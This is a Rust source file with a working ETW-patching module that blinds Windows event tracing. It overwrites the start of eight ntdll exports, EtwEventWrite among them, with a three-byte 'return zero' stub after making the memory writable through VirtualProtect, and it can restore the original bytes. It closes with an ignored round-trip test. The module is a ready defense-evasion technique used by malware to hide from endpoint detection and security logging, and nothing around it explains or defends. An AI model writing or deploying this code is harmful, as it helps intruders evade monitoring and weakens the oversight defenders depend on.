//!
//!
//!

#![allow(non_snake_case)]

use std::ffi::c_void;

#[cfg(target_os = "windows")]
#[link(name = "kernel32")]
extern "system" {
    fn GetModuleHandleA(name: *const u8) -> *mut c_void;
    fn GetProcAddress(module: *mut c_void, name: *const u8) -> *const c_void;
    fn VirtualProtect(addr: *mut c_void, size: usize, new_protect: u32, old: *mut u32) -> i32;
}

#[cfg(target_os = "windows")]
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

const ETW_PATCH: [u8; 3] = [0x33, 0xC0, 0xC3];

const ETW_EXPORTS: &[&[u8]] = &[
    b"EtwEventWrite\0",
    b"EtwEventWriteEx\0",
    b"EtwEventWriteString\0",
    b"EtwEventWriteTransfer\0",
    b"EtwWrite\0",
    b"EtwWriteEx\0",
    b"EtwWriteString\0",
    b"EtwWriteTransfer\0",
];

struct SavedPatch {
    addr: *mut u8,
    original: [u8; 3],
    old_protect: u32,
}

pub struct EtwSuppressor {
    saved: Vec<SavedPatch>,
}

impl EtwSuppressor {
    pub fn suppress() -> Option<Self> {
        #[cfg(target_os = "windows")]
        {
            unsafe {
                let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
                if ntdll.is_null() {
                    return None;
                }
                let mut saved = Vec::new();
                for export in ETW_EXPORTS {
                    let addr = GetProcAddress(ntdll, export.as_ptr());
                    if addr.is_null() {
                        continue;
                    }
                    let target = addr as *mut u8;
                    let mut old_protect: u32 = 0;
                    if VirtualProtect(
                        target as *mut c_void,
                        ETW_PATCH.len(),
                        PAGE_EXECUTE_READWRITE,
                        &mut old_protect,
                    ) == 0
                    {
                        continue;
                    }
                    let mut original = [0u8; 3];
                    std::ptr::copy_nonoverlapping(target, original.as_mut_ptr(), 3);
                    std::ptr::copy_nonoverlapping(ETW_PATCH.as_ptr(), target, 3);
                    saved.push(SavedPatch {
                        addr: target,
                        original,
                        old_protect,
                    });
                }
                if saved.is_empty() {
                    return None;
                }
                Some(EtwSuppressor { saved })
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = ();
            None
        }
    }

    pub fn restore(&mut self) {
        #[cfg(target_os = "windows")]
        unsafe {
            for p in self.saved.drain(..) {
                let mut tmp_protect: u32 = 0;
                VirtualProtect(
                    p.addr as *mut c_void,
                    p.original.len(),
                    PAGE_EXECUTE_READWRITE,
                    &mut tmp_protect,
                );
                std::ptr::copy_nonoverlapping(p.original.as_ptr(), p.addr, p.original.len());
                VirtualProtect(
                    p.addr as *mut c_void,
                    p.original.len(),
                    p.old_protect,
                    &mut tmp_protect,
                );
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            self.saved.clear();
        }
    }
}

impl Drop for EtwSuppressor {
    fn drop(&mut self) {
        self.restore();
    }
}

#[cfg(all(test, target_os = "windows"))]
mod tests {
    use super::*;

    #[test]
    #[ignore = "rewrites ntdll code — isolated environment only"]
    fn suppress_and_restore_roundtrip() {
        extern "system" {
            fn EtwEventWrite(
                reg_handle: *mut c_void,
                event_descriptor: *mut c_void,
                user_data_count: u32,
                user_data: *mut c_void,
            ) -> i32;
        }

        unsafe {
            let mut suppressor = EtwSuppressor::suppress().expect("suppress failed");
            let hr = EtwEventWrite(
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                0,
                std::ptr::null_mut(),
            );
            assert_eq!(hr, 0, "EtwEventWrite should be suppressed (hr={hr})");

            suppressor.restore();
            let hr2 = EtwEventWrite(
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                0,
                std::ptr::null_mut(),
            );
            assert_ne!(hr2, 0, "EtwEventWrite should be restored (hr={hr2})");
        }
    }
}
